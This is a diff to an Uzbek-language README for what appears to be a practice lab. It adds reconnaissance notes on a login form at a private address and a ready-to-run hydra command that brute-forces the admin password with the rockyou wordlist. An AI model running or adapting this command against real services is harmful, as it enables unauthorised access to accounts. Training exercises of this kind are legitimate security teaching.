@@ -20,6 +20,31 @@ Quyidagi vositalar shu mashinada ishga tayyor.
 
 ---
 
+## 🔎 Recon natijasi (bu lab uchun aniqlandi)
+
+Brauzerda `http://10.15.1.54:9004/login` ochilganda ko'rinadigan login sahifa:
+
+| Nima | Qiymat |
+|------|--------|
+| Form action (POST) | `/login` |
+| Maydonlar | `username`, `password` |
+| Tugma | `Sign in` |
+| **Xato matni** | `Invalid username or password.` |
+| Shuning uchun hydra | `F=Invalid` |
+
+Ya'ni tayyor buyruq:
+```bash
+hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -f -t 8 \
+      10.15.1.54 \
+      http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+```
+
+> Diqqat: `F=` faqat **xato** javobda uchraydigan matn bo'lishi kerak.
+> Bu sahifada xato javob `Invalid username or password.` bo'lgani uchun
+> `F=Invalid` to'g'ri ishlaydi (muvaffaqiyatli javobda "Invalid" yo'q).
+
+---
+
 ## Papka tarkibi
 
 | Fayl | Vazifasi |
